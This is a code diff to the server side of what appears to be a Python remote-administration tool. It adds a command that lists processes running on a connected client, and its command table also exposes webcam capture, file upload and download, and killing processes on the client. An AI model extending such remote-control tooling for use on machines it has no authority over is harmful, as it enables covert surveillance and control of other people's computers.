@@ -62,6 +62,33 @@ class Server(object):
                 printr(f'[red]Error, parameter [yellow]PID [red]must be a integer')
         else:
             printr('Info: Kills some process running by PID | Ex: [green]/killprocess 5003')
+    
+    # getting info of only one process
+    def getProcessInfo(self, processname):
+        if processname and self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = self.receiveHeader(connection)
+                if header['sucess']:
+                    processInfo = self.receiveProcessList(connection, header)
+                    table = Table(show_footer=False, title=f'List of all {processname.title()} processes running', box=SIMPLE) # creating table to show data from received processes
+                    for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd', 'Cpu', 'Mem']: # adding the columns
+                        table.add_column(column, justify='center')
+
+                    for process in processInfo: # adding the rows
+                        table.add_row(str(process['pid']), process['username'], process['name'], process['exe'], process['cwd'], f"{process['cpu_percent']}%", f"{process['memory_percent']:.2f}%")
+
+                    console = Console() # creating the Console object
+                    console.print(table, f':white_check_mark: {processname.title()} {header["total"]} processes running', justify="center") # printing the table
+                else:
+                    printr(header['content'])
+
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr('Info: Shows basic information of only one process running on the client side')
 
     # getting all processes running in client side
     def getProcessList(self, args):
@@ -73,7 +100,7 @@ class Server(object):
                 processInfo = self.receiveProcessList(connection, header)
                 table = Table(show_footer=False, title=f"List of all processes running.", box=SIMPLE) # creating table to show data from received processes
                 for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd']: # adding the columns
-                    table.add_column(column)
+                    table.add_column(column, justify="center")
 
                 for process in processInfo: # adding the rows
                     table.add_row(str(process['pid']), process['username'], process['name'], process['exe'], process['cwd'])
@@ -361,7 +388,8 @@ class Server(object):
             "/webcamshot": {"local": False, "action": self.webcamshot},
             "/download": {"local": False, "action": self.download},
             "/upload": {"local": False, "action": self.upload},
-            "/getprocesslist": {"local": False, "action": self.getProcessList},
+            "/processlist": {"local": False, "action": self.getProcessList},
+            "/processinfo": {"local": False, "action": self.getProcessInfo},
             "/terminateprocess": {"action": self.terminateProcess},
             "/killprocess": {"action": self.killProcess},
             "/author": {"local": True, "action": self.showCodeAuthor},
